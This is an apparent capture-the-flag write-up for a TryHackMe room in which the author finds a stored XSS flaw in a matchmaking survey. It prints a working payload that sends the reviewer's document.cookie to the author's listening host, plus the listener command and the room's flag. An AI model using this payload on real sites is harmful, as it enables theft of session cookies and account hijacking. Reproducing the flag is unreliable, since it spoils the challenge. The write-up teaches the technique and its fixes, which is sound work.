# Cupid's Matchmaker

**Room:** [Love at First Breach 2026 – Cupid's Matchmaker](https://tryhackme.com/room/lafb2026e3)

A stored XSS vulnerability in a "human-powered" matchmaking survey. The site claims a real person reads every submission — no AI, no algorithms — but that "human review" is exactly what makes it vulnerable: whatever you write in the form gets rendered somewhere on the backend, and if that render isn't sanitized, your script runs in someone else's browser.

![Cupid's Matchmaker](screenshots/01_room_banner.png)

---

## Recon

Let's navigate to the URL and check what we get.

![Homepage](screenshots/02_homepage.png)

The site's pitch is "No Algorithms. No AI. Just Real Human Matchmakers" — so somewhere behind the scenes, an actual person (or at least an admin panel) is reading whatever gets submitted.

There's a survey option, so let's go there.

![Survey form](screenshots/03_survey_form.png)

After submitting it, the survey just says it goes to the developers/matchmaking team and nothing else happens on the frontend.

Let's try gobuster on it:

```
gobuster dir -u http://10.112.129.122:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Gobuster scan](screenshots/04_gobuster_scan.png)

Interesting — we find an admin page. Let's go there and check it out.

![Admin login page](screenshots/05_admin_login_page.png)

I tried a bunch of tricks and payloads on the login form, but nothing worked there. So I went back to the survey form instead — since it said the submission goes to the developers/team for review, maybe there's something to get from that side of things.

I tried an XSS payload in the survey and it gave me a green success signal.

![Survey submitted successfully](screenshots/06_xss_success_banner.png)

---

## Exploiting the XSS

Now let's work on it properly. The idea is to steal the session cookie of whoever (the "matchmaking team" / admin) opens and reviews the submission. I wasn't sure exactly which field on the form actually gets rendered unsanitized on the review side, so I dropped the payload into every field just to be safe.

Payload used:

```html
<img src=x onerror="new Image().src='http://192.168.134.30:5000/?cookie='+encodeURIComponent(document.cookie)">
```

![XSS payload filled into every survey field](screenshots/07_xss_payload_in_survey.png)

On the other end, I set up a listener on port 5000:

```
python3 -m http.server 5000
```

Once the admin/reviewer opened the submission, the payload fired and the cookie came in as a URL-encoded GET request — since the payload uses `encodeURIComponent`.

![Listener catching the cookie](screenshots/08_listener_captures_cookie.png)

The captured request looked like:

```
GET /?cookie=flag%3DTHM%7BXSS_CuP1d_Str1k3s_Ag41n%7D HTTP/1.1
```

I then took that URL-encoded string and decoded it using CyberChef (URL Decode recipe), which revealed the flag directly.

![Decoding the cookie in CyberChef](screenshots/09_cyberchef_decoded_flag.png)

---

## Flag

```
THM{XSS_CuP1d_Str1k3s_Ag41n}
```

---

## Vulnerability Summary

| | |
|---|---|
| **Vulnerability** | Stored Cross-Site Scripting (XSS) |
| **Location** | "Take Survey" form fields (rendered unsanitized in the admin/matchmaking team's review panel) |
| **Root Cause** | User-submitted survey input is stored and later rendered on an internal/admin-facing page without proper output encoding or sanitization |
| **Impact** | An attacker can inject JavaScript into a survey submission that executes in the browser of whoever reviews it (in this case, an admin), allowing session cookie theft and potential account/session hijacking |
| **Fix** | Sanitize and encode all user input before rendering it anywhere, especially on privileged/admin-facing pages. Use a Content Security Policy (CSP) to restrict inline scripts and outbound requests, and mark session cookies as `HttpOnly` so they can't be read via `document.cookie` in the first place |
